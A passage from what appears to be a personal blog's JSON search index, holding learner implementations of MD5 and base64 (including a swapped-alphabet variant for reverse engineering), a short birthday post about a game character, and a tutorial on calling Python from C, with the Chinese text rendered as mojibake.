0; &#125; else &#123; i = 0; &#125; memcpy(&amp;context->buffer[index],&amp;input[i],inputlen-i);&#125;void MD5Final(MD5_CTX *context,unsigned char digest[16])&#123; unsigned int index = 0,padlen = 0; unsigned char bits[8]; index = (context->count[0] >> 3) &amp; 0x3F; padlen = (index &lt; 56)?(56-index):(120-index); MD5Encode(bits,context->count,8); MD5Update(context,PADDING,padlen); MD5Update(context,bits,8); MD5Encode(digest,context->state,16);&#125;void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len)&#123; unsigned int i = 0,j = 0; while(j &lt; len) &#123; output[j] = input[i] &amp; 0xFF; output[j+1] = (input[i] >> 8) &amp; 0xFF; output[j+2] = (input[i] >> 16) &amp; 0xFF; output[j+3] = (input[i] >> 24) &amp; 0xFF; i++; j+=4; &#125;&#125;void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len)&#123; unsigned int i = 0,j = 0; while(j &lt; len) &#123; output[i] = (input[j]) | (input[j+1] &lt;&lt; 8) | (input[j+2] &lt;&lt; 16) | (input[j+3] &lt;&lt; 24); i++; j+=4; &#125;&#125;void MD5Transform(unsigned int state[4],unsigned char block[64])&#123; unsigned int a = state[0]; unsigned int b = state[1]; unsigned int c = state[2]; unsigned int d = state[3]; unsigned int x[64]; MD5Decode(x,block,64); FF(a, b, c, d, x[ 0], 7, 0xd76aa478); /* 1 */ FF(d, a, b, c, x[ 1], 12, 0xe8c7b756); /* 2 */ FF(c, d, a, b, x[ 2], 17, 0x242070db); /* 3 */ FF(b, c, d, a, x[ 3], 22, 0xc1bdceee); /* 4 */ FF(a, b, c, d, x[ 4], 7, 0xf57c0faf); /* 5 */ FF(d, a, b, c, x[ 5], 12, 0x4787c62a); /* 6 */ FF(c, d, a, b, x[ 6], 17, 0xa8304613); /* 7 */ FF(b, c, d, a, x[ 7], 22, 0xfd469501); /* 8 */ FF(a, b, c, d, x[ 8], 7, 0x698098d8); /* 9 */ FF(d, a, b, c, x[ 9], 12, 0x8b44f7af); /* 10 */ FF(c, d, a, b, x[10], 17, 0xffff5bb1); /* 11 */ FF(b, c, d, a, x[11], 22, 0x895cd7be); /* 12 */ FF(a, b, c, d, x[12], 7, 0x6b901122); /* 13 */ FF(d, a, b, c, x[13], 12, 0xfd987193); /* 14 */ FF(c, d, a, b, x[14], 17, 0xa679438e); /* 15 */ FF(b, c, d, a, x[15], 22, 0x49b40821); /* 16 */ /* Round 2 */ GG(a, b, c, d, x[ 1], 5, 0xf61e2562); /* 17 */ GG(d, a, b, c, x[ 6], 9, 0xc040b340); /* 18 */ GG(c, d, a, b, x[11], 14, 0x265e5a51); /* 19 */ GG(b, c, d, a, x[ 0], 20, 0xe9b6c7aa); /* 20 */ GG(a, b, c, d, x[ 5], 5, 0xd62f105d); /* 21 */ GG(d, a, b, c, x[10], 9, 0x2441453); /* 22 */ GG(c, d, a, b, x[15], 14, 0xd8a1e681); /* 23 */ GG(b, c, d, a, x[ 4], 20, 0xe7d3fbc8); /* 24 */ GG(a, b, c, d, x[ 9], 5, 0x21e1cde6); /* 25 */ GG(d, a, b, c, x[14], 9, 0xc33707d6); /* 26 */ GG(c, d, a, b, x[ 3], 14, 0xf4d50d87); /* 27 */ GG(b, c, d, a, x[ 8], 20, 0x455a14ed); /* 28 */ GG(a, b, c, d, x[13], 5, 0xa9e3e905); /* 29 */ GG(d, a, b, c, x[ 2], 9, 0xfcefa3f8); /* 30 */ GG(c, d, a, b, x[ 7], 14, 0x676f02d9); /* 31 */ GG(b, c, d, a, x[12], 20, 0x8d2a4c8a); /* 32 */ /* Round 3 */ HH(a, b, c, d, x[ 5], 4, 0xfffa3942); /* 33 */ HH(d, a, b, c, x[ 8], 11, 0x8771f681); /* 34 */ HH(c, d, a, b, x[11], 16, 0x6d9d6122); /* 35 */ HH(b, c, d, a, x[14], 23, 0xfde5380c); /* 36 */ HH(a, b, c, d, x[ 1], 4, 0xa4beea44); /* 37 */ HH(d, a, b, c, x[ 4], 11, 0x4bdecfa9); /* 38 */ HH(c, d, a, b, x[ 7], 16, 0xf6bb4b60); /* 39 */ HH(b, c, d, a, x[10], 23, 0xbebfbc70); /* 40 */ HH(a, b, c, d, x[13], 4, 0x289b7ec6); /* 41 */ HH(d, a, b, c, x[ 0], 11, 0xeaa127fa); /* 42 */ HH(c, d, a, b, x[ 3], 16, 0xd4ef3085); /* 43 */ HH(b, c, d, a, x[ 6], 23, 0x4881d05); /* 44 */ HH(a, b, c, d, x[ 9], 4, 0xd9d4d039); /* 45 */ HH(d, a, b, c, x[12], 11, 0xe6db99e5); /* 46 */ HH(c, d, a, b, x[15], 16, 0x1fa27cf8); /* 47 */ HH(b, c, d, a, x[ 2], 23, 0xc4ac5665); /* 48 */ /* Round 4 */ II(a, b, c, d, x[ 0], 6, 0xf4292244); /* 49 */ II(d, a, b, c, x[ 7], 10, 0x432aff97); /* 50 */ II(c, d, a, b, x[14], 15, 0xab9423a7); /* 51 */ II(b, c, d, a, x[ 5], 21, 0xfc93a039); /* 52 */ II(a, b, c, d, x[12], 6, 0x655b59c3); /* 53 */ II(d, a, b, c, x[ 3], 10, 0x8f0ccc92); /* 54 */ II(c, d, a, b, x[10], 15, 0xffeff47d); /* 55 */ II(b, c, d, a, x[ 1], 21, 0x85845dd1); /* 56 */ II(a, b, c, d, x[ 8], 6, 0x6fa87e4f); /* 57 */ II(d, a, b, c, x[15], 10, 0xfe2ce6e0); /* 58 */ II(c, d, a, b, x[ 6], 15, 0xa3014314); /* 59 */ II(b, c, d, a, x[13], 21, 0x4e0811a1); /* 60 */ II(a, b, c, d, x[ 4], 6, 0xf7537e82); /* 61 */ II(d, a, b, c, x[11], 10, 0xbd3af235); /* 62 */ II(c, d, a, b, x[ 2], 15, 0x2ad7d2bb); /* 63 */ II(b, c, d, a, x[ 9], 21, 0xeb86d391); /* 64 */ state[0] += a; state[1] += b; state[2] += c; state[3] += d;&#125; #ifndef MD5_H#define MD5_H typedef struct&#123; unsigned int count[2]; unsigned int state[4]; unsigned char buffer[64]; &#125;MD5_CTX; #define F(x,y,z) ((x &amp; y) | (~x &amp; z))#define G(x,y,z) ((x &amp; z) | (y &amp; ~z))#define H(x,y,z) (x^y^z)#define I(x,y,z) (y ^ (x | ~z))#define ROTATE_LEFT(x,n) ((x &lt;&lt; n) | (x >> (32-n)))#define FF(a,b,c,d,x,s,ac) \\ &#123; \\ a += F(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define GG(a,b,c,d,x,s,ac) \\ &#123; \\ a += G(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define HH(a,b,c,d,x,s,ac) \\ &#123; \\ a += H(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define II(a,b,c,d,x,s,ac) \\ &#123; \\ a += I(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125; void MD5Init(MD5_CTX *context);void MD5Update(MD5_CTX *context,unsigned char *input,unsigned int inputlen);void MD5Final(MD5_CTX *context,unsigned char digest[16]);void MD5Transform(unsigned int state[4],unsigned char block[64]);void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len);void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len); #endif # DES # base import base64str = \"this is base64!\" # æ¬²è§£å¯†çš„å­—ç¬¦ä¸²outtab = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" # åŸç”Ÿå­—æ¯è¡¨# å¦‚æœé‡åˆ°æ¢è¡¨ base64, ä¿®æ”¹ intab!!intab = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" # æ¢è¡¨ä¹‹åçš„å­—æ¯è¡¨ciphertext = base64.b64encode(str.translate(str.maketrans(intab, outtab)).encode())print(\"ciphertext:\", ciphertext)ciphertext = ciphertext.decode()decrypted = base64.b64decode(ciphertext.translate(ciphertext.maketrans(intab, outtab)))print(\"decrypted:\", decrypted)'''ciphertext: b'dGhpcyBpcyBiYXNlNjQh'decrypted: b'this is base64!''' import string# base å­—ç¬¦é›†base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'def encrypt(origin_bytes): \"\"\" å°†bytesç±»å‹ç¼–ç ä¸ºbase64 :param origin_bytes:éœ€è¦ç¼–ç çš„bytes :return:base64å­—ç¬¦ä¸² \"\"\" # å°†æ¯ä¸€ä½ bytes è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸² base64_bytes = ['&#123;:0>8&#125;'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes] resp = '' nums = len(base64_bytes) // 3 remain = len(base64_bytes) % 3 integral_part = base64_bytes[0:3 * nums] while integral_part: # å–ä¸‰ä¸ªå­—èŠ‚ï¼Œä»¥æ¯ 6 æ¯”ç‰¹ï¼Œè½¬æ¢ä¸º 4 ä¸ªæ•´æ•° tmp_unit = ''.join(integral_part[0:3]) tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]] # å–å¯¹åº” base64 å­—ç¬¦ resp += ''.join([base64_charset[i] for i in tmp_unit]) integral_part = integral_part[3:] if remain: # è¡¥é½ä¸‰ä¸ªå­—èŠ‚ï¼Œæ¯ä¸ªå­—èŠ‚è¡¥å…… 0000 0000 remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8 # å–ä¸‰ä¸ªå­—èŠ‚ï¼Œä»¥æ¯ 6 æ¯”ç‰¹ï¼Œè½¬æ¢ä¸º 4 ä¸ªæ•´æ•° # å‰©ä½™ 1 å­—èŠ‚å¯æ„é€  2 ä¸ª base64 å­—ç¬¦ï¼Œè¡¥å…… ==ï¼›å‰©ä½™ 2 å­—èŠ‚å¯æ„é€  3 ä¸ª base64 å­—ç¬¦ï¼Œè¡¥å…… = tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1] resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '=' return respdef decrypt(base64_str): \"\"\" è§£ç base64å­—ç¬¦ä¸² :param base64_str:base64å­—ç¬¦ä¸² :return:è§£ç åçš„bytearrayï¼›è‹¥å…¥å‚ä¸æ˜¯åˆæ³•base64å­—ç¬¦ä¸²ï¼Œè¿”å›ç©ºbytearray \"\"\" if not valid_base64_str(base64_str): return bytearray() # å¯¹æ¯ä¸€ä¸ª base64 å­—ç¬¦å–ä¸‹æ ‡ç´¢å¼•ï¼Œå¹¶è½¬æ¢ä¸º 6 ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸² base64_bytes = ['&#123;:0>6&#125;'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if s != '='] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: # å– 4 ä¸ª 6 ä½ base64 å­—ç¬¦ï¼Œä½œä¸º 3 ä¸ªå­—èŠ‚ tmp_unit = ''.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = ''.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return respdef valid_base64_str(b_str): \"\"\" éªŒè¯æ˜¯å¦ä¸ºåˆæ³•base64å­—ç¬¦ä¸² :param b_str: å¾…éªŒè¯çš„base64å­—ç¬¦ä¸² :return:æ˜¯å¦åˆæ³• \"\"\" if len(b_str) % 4: return False for m in b_str: if m not in base64_charset: return False return Trueif __name__ == '__main__': s = 'this is base64!' ciphertext = encrypt(s.encode()) print('ciphertext:', ciphertext) decrypted = decrypt(ciphertext).decode() print('decrypted:', decrypted)'''ciphertext: dGhpcyBpcyBiYXNlNjQhdecrypted: this is base64!''' #include &lt;stdio.h> #include &lt;string.h> #include &lt;stdlib.h> unsigned char *base64_encode(unsigned char *str) &#123; long len; long str_len; unsigned char *res; int i,j; // å®šä¹‰ base64 ç¼–ç è¡¨ unsigned char *base64_table=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; // è®¡ç®—ç»è¿‡ base64 ç¼–ç åçš„å­—ç¬¦ä¸²é•¿åº¦ str_len=strlen(str); if(str_len % 3 == 0) len=str_len/3*4; else len=(str_len/3+1)*4; res=malloc(sizeof(unsigned char)*len+1); res[len]='\\0'; // ä»¥ 3 ä¸ª 8 ä½å­—ç¬¦ä¸ºä¸€ç»„è¿›è¡Œç¼–ç  for(i=0,j=0;i&lt;len-2;j+=3,i+=4) &#123; res[i]=base64_table[str[j]>>2]; // å–å‡ºç¬¬ä¸€ä¸ªå­—ç¬¦çš„å‰ 6 ä½å¹¶æ‰¾å‡ºå¯¹åº”çš„ç»“æœå­—ç¬¦ res[i+1]=base64_table[(str[j]&amp;0x3)&lt;&lt;4 | (str[j+1]>>4)]; // å°†ç¬¬ä¸€ä¸ªå­—ç¬¦çš„åä½ä¸ç¬¬äºŒä¸ªå­—ç¬¦çš„å‰ 4 ä½è¿›è¡Œç»„åˆå¹¶æ‰¾åˆ°å¯¹åº”çš„ç»“æœå­—ç¬¦ res[i+2]=base64_table[(str[j+1]&amp;0xf)&lt;&lt;2 | (str[j+2]>>6)]; // å°†ç¬¬äºŒä¸ªå­—ç¬¦çš„å 4 ä½ä¸ç¬¬ä¸‰ä¸ªå­—ç¬¦çš„å‰ 2 ä½ç»„åˆå¹¶æ‰¾å‡ºå¯¹åº”çš„ç»“æœå­—ç¬¦ res[i+3]=base64_table[str[j+2]&amp;0x3f]; // å–å‡ºç¬¬ä¸‰ä¸ªå­—ç¬¦çš„å 6 ä½å¹¶æ‰¾å‡ºç»“æœå­—ç¬¦ &#125; switch(str_len % 3) &#123; case 1: res[i-2]='='; res[i-1]='='; break; case 2: res[i-1]='='; break; &#125; return res; &#125; unsigned char *base64_decode(unsigned char *code) &#123; // æ ¹æ® base64 è¡¨ï¼Œä»¥å­—ç¬¦æ‰¾åˆ°å¯¹åº”çš„åè¿›åˆ¶æ•°æ® int table[]=&#123;0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,62,0,0,0, 63,52,53,54,55,56,57,58, 59,60,61,0,0,0,0,0,0,0,0, 1,2,3,4,5,6,7,8,9,10,11,12, 13,14,15,16,17,18,19,20,21, 22,23,24,25,0,0,0,0,0,0,26, 27,28,29,30,31,32,33,34,35, 36,37,38,39,40,41,42,43,44, 45,46,47,48,49,50,51 &#125;; long len; long str_len; unsigned char *res; int i,j; // è®¡ç®—è§£ç åçš„å­—ç¬¦ä¸²é•¿åº¦ len=strlen(code); // åˆ¤æ–­ç¼–ç åçš„å­—ç¬¦ä¸²åæ˜¯å¦æœ‰ = if(strstr(code,\"==\")) str_len=len/4*3-2; else if(strstr(code,\"=\")) str_len=len/4*3-1; else str_len=len/4*3; res=malloc(sizeof(unsigned char)*str_len+1); res[str_len]='\\0'; // ä»¥ 4 ä¸ªå­—ç¬¦ä¸ºä¸€ä½è¿›è¡Œè§£ç  for(i=0,j=0;i &lt; len-2;j+=3,i+=4) &#123; res[j]=((unsigned char)table[code[i]])&lt;&lt;2 | (((unsigned char)table[code[i+1]])>>4); // å–å‡ºç¬¬ä¸€ä¸ªå­—ç¬¦å¯¹åº” base64 è¡¨çš„åè¿›åˆ¶æ•°çš„å‰ 6 ä½ä¸ç¬¬äºŒä¸ªå­—ç¬¦å¯¹åº” base64 è¡¨çš„åè¿›åˆ¶æ•°çš„å 2 ä½è¿›è¡Œç»„åˆ res[j+1]=(((unsigned char)table[code[i+1]])&lt;&lt;4) | (((unsigned char)table[code[i+2]])>>2); // å–å‡ºç¬¬äºŒä¸ªå­—ç¬¦å¯¹åº” base64 è¡¨çš„åè¿›åˆ¶æ•°çš„å 4 ä½ä¸ç¬¬ä¸‰ä¸ªå­—ç¬¦å¯¹åº” bas464 è¡¨çš„åè¿›åˆ¶æ•°çš„å 4 ä½è¿›è¡Œç»„åˆ res[j+2]=(((unsigned char)table[code[i+2]])&lt;&lt;6) | ((unsigned char)table[code[i+3]]); // å–å‡ºç¬¬ä¸‰ä¸ªå­—ç¬¦å¯¹åº” base64 è¡¨çš„åè¿›åˆ¶æ•°çš„å 2 ä½ä¸ç¬¬ 4 ä¸ªå­—ç¬¦è¿›è¡Œç»„åˆ &#125; return res; &#125; int main(int argc,char **argv) &#123; unsigned char *buf =NULL; unsigned char *str = \"this is base64!\"; buf = base64_encode(str); printf(\"cipheytext: %s\\n\",buf); buf = base64_decode(buf); printf(\"decrypted: %s\\n\",buf); free(buf); return 0; &#125;/*cipheytext: dGhpcyBpcyBiYXNlNjQhdecrypted: this is base64! */ todo todo todo todo todo todo # blowfish # chacha20","categories":[],"tags":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://oacia.dev/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"ç¥å°å¤ç”Ÿæ—¥å¿«ä¹(à¹‘ËƒÌê‡´Ë‚Ì€à¹‘)","slug":"ç¥å°å¤ç”Ÿæ—¥å¿«ä¹ï¼Ì‹(à¹‘ËƒÌê‡´Ë‚Ì€à¹‘)","date":"2022-12-03T16:00:00.000Z","updated":"2023-07-01T03:56:14.024Z","comments":true,"path":"ç¥å°å¤ç”Ÿæ—¥å¿«ä¹ï¼Ì‹(à¹‘ËƒÌê‡´Ë‚Ì€à¹‘)/","link":"","permalink":"https://oacia.dev/%E7%A5%9D%E5%B0%8F%E5%A4%8F%E7%94%9F%E6%97%A5%E5%BF%AB%E4%B9%90%EF%BC%81%CC%8B(%E0%B9%91%CB%83%CC%81%EA%87%B4%CB%82%CC%80%E0%B9%91)/","excerpt":"","text":"# 12 æœˆ 4 å·ï¼Œå°å¤çš„ç”Ÿæ—¥åˆ°å•¦ï¼ŒçœŸæ˜¯ä¸€ä»¶ä»¤äººå¼€å¿ƒçš„äº‹ï½ è¿™ä½æ˜¯æ”¾å­¦åç”œå“éƒ¨çš„éº»çƒ¦åˆ¶é€ ç¬¬ä¸€åä»¥åŠè‡ªç§°æµªæ¼«å®¶çš„å°å¤åŒå­¦ï¼ æŠ±ç€ã€Œæƒ³å’Œå¤§å®¶ä¸€èµ·åˆ†äº«æµªæ¼«ã€çš„å¿ƒæƒ…ã€ç»å¸¸è¯´å‡ºçˆ†ç‚¸æ€§å‘è¨€å¹¶æŠŠå‘¨å›´éƒ½ç‰µæ‰¯è¿›æ¥ã€ã€Œæµªæ¼«ã€çš„å®šä¹‰ä¹Ÿç»å¸¸å˜åŒ–ç€çš„æ ·å­â€¦ã€‚ ã€Œå…³äºå¥¶æ²¹è›‹ç³•æœ‰æƒ³åˆ°è¿‡äº›ä»€ä¹ˆå—ï¼Ÿ ã€ è¿˜è®°å¾—ä»Šå¹´ä¹æœˆä»½å…¥å‘è”šè“æ¡£æ¡ˆçš„æ—¶å€™ï¼Œå°±æ˜¯å› ä¸ºçœ‹è§äº†å°å¤ï¼Œå¥¹å®åœ¨å¤ªå¯çˆ±äº† (â‰§â–½â‰¦)","categories":[],"tags":[{"name":"æŸšé¸Ÿå¤","slug":"æŸšé¸Ÿå¤","permalink":"https://oacia.dev/tags/%E6%9F%9A%E9%B8%9F%E5%A4%8F/"}]},{"title":"åœ¨Cè¯­è¨€ä¸­è°ƒç”¨Python","slug":"ç”¨cè°ƒç”¨python","date":"2022-11-08T16:00:00.000Z","updated":"2023-09-03T16:51:44.737Z","comments":true,"path":"ç”¨cè°ƒç”¨python/","link":"","permalink":"https://oacia.dev/%E7%94%A8c%E8%B0%83%E7%94%A8python/","excerpt":"","text":"# 0x0 start é¦–å…ˆå¯¼å…¥ Python.h, å¹¶æ·»åŠ  python37_d.lib ä¾èµ– # 0x1 é‡åˆ°çš„é—®é¢˜ åˆšå¼€å§‹è·Ÿç€æ•™ç¨‹èµ°ï¼Œç»“æœæ€»æ˜¯æç¤ºç¼ºå°‘ python37_d.lib ä¾èµ–ï¼Œåæ¥æ ¹æ®ä¸‹é¢çš„æ‰¾åˆ°çš„æ•™ç¨‹æ‰å‘ç°åº“ç›®å½•æ‰æ˜¯æœ‰ä¾èµ–æœç´¢çš„ç›®å½• ~~ çœ‹æ•™ç¨‹é‡Œæ˜¯ä»ä¸Šå¾€ä¸‹æ•°ç¬¬å››ä¸ªæ”¹æˆäº† C:\\environment\\Python37\\libs ç»“æœè¢«éª—äº†â€¦~~QAQ https://blog.csdn.net/bandaoyu/article/details/105102945 äºæ˜¯ vs çš„ VC++ ç›®å½•çš„é…ç½®å¯ä»¥å¦‚å›¾æ‰€ç¤º å¹¶ä¸”åœ¨é“¾æ¥å™¨çš„è¾“å…¥å­ç›®å½•å†…æ·»åŠ  python python37_d.lib ä¾èµ– è¿™æ ·ä¿®æ”¹ Python.h å¤´æ–‡ä»¶å¯ä»¥æ­£ç¡®çš„åŒ…å«è¿›æ¥ # 0x2 è¯•ç”¨ç½‘ä¸Šçš„ c è°ƒç”¨ python çš„ä»£ç  #include&lt;stdio.h>#include &lt;Python.h>int main()&#123; PyObject *pName, *pModule, *pDict, *pFunc; PyObject *pArgs, *pValue; // å¾…ä¼ å‚æ•° int time[6]=&#123;1,2,3,4,5,6&#125;; // åˆå§‹åŒ– python Py_Initialize(); // æ£€æŸ¥åˆå§‹åŒ–æ˜¯å¦æˆåŠŸ if (!Py_IsInitialized()) &#123; printf(\"åˆå§‹åŒ–å¤±è´¥\\n\"); Py_Finalize(); &#125; // è®¾ç½® python æ¨¡å—ï¼Œæœå¯»ä½ç½®ï¼Œæ–‡ä»¶æ”¾åœ¨.c æ–‡ä»¶ä¸€èµ· PyRun_SimpleString(\"import sys\"); PyRun_SimpleString(\"sys.path.append('./')\"); // è·å– python æ–‡ä»¶åï¼Œå¯¼å…¥æ¨¡å—ï¼ˆæˆ‘è¿™é‡Œçš„ py æ–‡ä»¶æ˜¯ graph.pyï¼‰ pModule = PyImport_ImportModule(\"graph\"); if (!pModule) &#123; printf(\"pyæ–‡ä»¶å¯¼å…¥å¤±è´¥\\n\"); Py_Finalize(); &#125; else &#123; // ç›´æ¥è·å–æ¨¡å—ä¸­çš„å‡½æ•° pFunc = PyObject_GetAttrString(pModule, \"create_graph\"); // éªŒè¯å‡½æ•°æ˜¯å¦è·å–æˆåŠŸ if (!pFunc) &#123; printf(\"å‡½æ•°å¯¼å…¥å¤±è´¥\\n\"); Py_Finalize(); &#125; // å°† c/c++ ç±»å‹æ•°æ®è½¬æ¢ä¸º python ç±»å‹ï¼Œåˆ©ç”¨å…ƒç»„ä¼ é€’ pArgs = PyTuple_New(6); pValue = PyLong_FromLong(time[0]); PyTuple_SetItem(pArgs, 0, pValue); pValue = PyLong_FromLong(time[1]); PyTuple_SetItem(pArgs, 1, pValue); pValue = PyLong_FromLong(time[2]); PyTuple_SetItem(pArgs, 2, pValue); pValue = PyLong_FromLong(time[3]); PyTuple_SetItem(pArgs, 3, pValue); pValue = PyLong_FromLong(time[4]); PyTuple_SetItem(pArgs, 4, pValue); pValue = PyLong_FromLong(time[5]); PyTuple_SetItem(pArgs, 5, pValue); // è°ƒç”¨ç›´æ¥è·å¾—çš„å‡½æ•°ï¼Œå¹¶ä¼ é€’å‚æ•° pValue = PyObject_CallObject(pFunc, pArgs); // é‡Šæ”¾ python Py_Finalize(); printf(\"success\"); return 0; &#125;&#125;graph.py çš„ä»£ç  # -*- coding:utf-8 -*-import xlsxwriterdef create_graph(a,b,c,d,e,f): # åˆ›å»ºä¸€ä¸ª excel workbook = xlsxwriter.Workbook(\"æ’åºç®—æ³•æ¯”è¾ƒç»“æœ.xlsx\") # åˆ›å»ºä¸€ä¸ª sheet worksheet = workbook.add_worksheet() # worksheet = workbook.add_worksheet(\"bug_analysis\") # è‡ªå®šä¹‰æ ·å¼ï¼ŒåŠ ç²— bold = workbook.add_format(&#123;'bold': 1&#125;) # --------1ã€å‡†å¤‡æ•°æ®å¹¶å†™å…¥ excel--------------- # å‘ excel ä¸­å†™å…¥æ•°æ®ï¼Œå»ºç«‹å›¾æ ‡æ—¶è¦ç”¨åˆ° headings = [\"æ’åºæ–¹æ³•\", \"æ’åºæ—¶é—´\"] data = [[\"ç®€å•é€‰æ‹©æ’åº\", \"ç›´æ¥æ’å…¥æ’åº\", \"å†’æ³¡æ’åº\", \"å¿«é€Ÿæ’åº\", \"ä¸¤è·¯åˆå¹¶æ’åº\", \"å †æ’åº\"],[a,b,c,d,e,f]] # å†™å…¥è¡¨å¤´ worksheet.write_row('A1', headings, bold) # å†™å…¥æ•°æ® worksheet.write_column('A2', data[0]) worksheet.write_column('B2', data[1]) # --------2ã€ç”Ÿæˆå›¾è¡¨å¹¶æ’å…¥åˆ° excel--------------- # åˆ›å»ºä¸€ä¸ªæŸ±çŠ¶å›¾ (column chart) chart_col = workbook.add_chart(&#123;'type': 'column'&#125;) # é…ç½®ç¬¬ä¸€ä¸ªç³»åˆ—æ•°æ® chart_col.add_series(&#123;'name': '=Sheet1!$B$1','categories': '=Sheet1!$A$2:$A$7','values': '=Sheet1!$B$2:$B$7','line': &#123;'color': 'red'&#125;,&#125;) # è¿™é‡Œçš„ sheet1 æ˜¯é»˜è®¤çš„å€¼ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨æ–°å»º sheet æ—¶æ²¡æœ‰æŒ‡å®š sheet å # å¦‚æœæˆ‘ä»¬æ–°å»º sheet æ—¶è®¾ç½®äº† sheet åï¼Œè¿™é‡Œå°±è¦è®¾ç½®æˆç›¸åº”çš„å€¼ # è®¾ç½®å›¾è¡¨çš„ title å’Œ xï¼Œy è½´ä¿¡æ¯ chart_col.set_title(&#123;'name': \"æ’åºç®—æ³•ç»“æœ\"&#125;) chart_col.set_x_axis(&#123;'name': \"æ’åºæ–¹æ³•\"&#125;) chart_col.set_y_axis(&#123;'name': \"èŠ±è´¹æ—¶é—´(ms)\"&#125;) # è®¾ç½®å›¾è¡¨çš„é£æ ¼ chart_col.set_style(1) # æŠŠå›¾è¡¨æ’å…¥åˆ° worksheet ä»¥åŠåç§» worksheet.insert_chart('A10', chart_col, &#123;'x_offset': 25, 'y_offset': 10&#125;) workbook.close() return 0if __name__==\"__main__\": create_graph(10, 40, 50, 20, 10, 50) èŠœæ¹–è¿è¡ŒæˆåŠŸï¼ æ²¡æƒ³åˆ°ç¬¬ä¸€æ¬¡è¿è¡Œå°±å¦‚æ­¤é¡ºåˆ© åœ¨çœ‹çœ‹æºæ–‡ä»¶ä¸‹çš„ç›®å½•æœ‰æ²¡æœ‰ç”Ÿæˆ .xlsx æ–‡ä»¶ ç¡®å®å¤šäº†ä¸€ä¸ªï¼Œä¸é”™ä¸é”™. # 0x3 è‡ªå·±å†™ä¸€ä¸ª helloworld! ä¸è¿‡è¿™ä¸ª helloworld æ˜¯è°ƒç”¨ python çš„å‡½æ•°æ‰“å°çš„ å¯æ¶æ–°å¼€äº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼Œåˆå¾—é‡æ–°é…ç½®åŒ…å«ç›®å½•äº†ï¼Œ å¿ƒç´¯ #include&lt;Python.h>#include&lt;stdio.h>int main()&#123; PyObject* pName, * pModule, * pDict, * pFunc; PyObject* pArgs, * pValue;// ç»å…¸å¤åˆ¶ç²˜è´´å˜é‡ï¼ˆè¿™ç©æ„å„¿è‡ªå·±ä¸€ä¸ªä¸€ä¸ªæ‰“ä¹Ÿå¤ªéº»çƒ¦äº†è€Œä¸”ä¹Ÿè®°ä¸ä½å‘€ï¼‰ Py_Initialize();// åˆå§‹åŒ–ä¸€ä¸‹ï½ if (!Py_IsInitialized())// çœ‹çœ‹åˆå§‹åŒ–æœ‰æ²¡æœ‰æˆåŠŸ &#123; printf(\"åˆå§‹åŒ–å¤±è´¥\\n\"); Py_Finalize(); &#125; PyRun_SimpleString(\"import sys\");// è®¾ç½® python æ¨¡å—ï¼Œæœå¯»ä½ç½®ï¼Œæ–‡ä»¶æ”¾åœ¨.c æ–‡ä»¶ä¸€èµ· PyRun_SimpleString(\"sys.path.append(./)\"); pModule = PyImport_ImportModule(\"hello\");// å¯¼å…¥ hello.py if (!pModule) &#123; printf(\"pyæ–‡ä»¶å¯¼å…¥å¤±è´¥\\n\"); Py_Finalize(); &#125; else//hello.py å¦‚æœæ‰“å¼€æˆåŠŸï¼Œç›´æ¥è·å–æ¨¡å—çš„å‡½æ•° &#123; pFunc = PyObject_GetAttrString(pModule, \"printhello\"); if (!pFunc) &#123; printf(\"å‡½æ•°å¯¼å…¥å¤±è´¥\\n\"); Py_Finalize(); &#125; &#125; // æ²¡å‚æ•°ï¼Œå°±ä¸ç”¨ demo0 é‡Œé¢é‚£ä¹ˆéº»çƒ¦å•Šå§å•Šå§äº†ï½ pValue = PyObject_CallObject(pFunc, pArgs);// è°ƒç”¨å‡½æ•° Py_Finalize();// é‡Šæ”¾ python return 0;&#125;def printhello() print(\"hello,world!\")printhello()å†™å¥½å•¦ï½è¿è¡Œçœ‹çœ‹ pFunc å¯èƒ½æœªåˆå§‹åŒ–éƒ½ä¸è®©è¿è¡Œï¼ŒçœŸ gou! #include&lt;Python.h>#include&lt;stdio.h>int main()&#123; PyObject* pName, * pModule, * pDict, * pFunc; PyObject* pArgs,* pValue;// 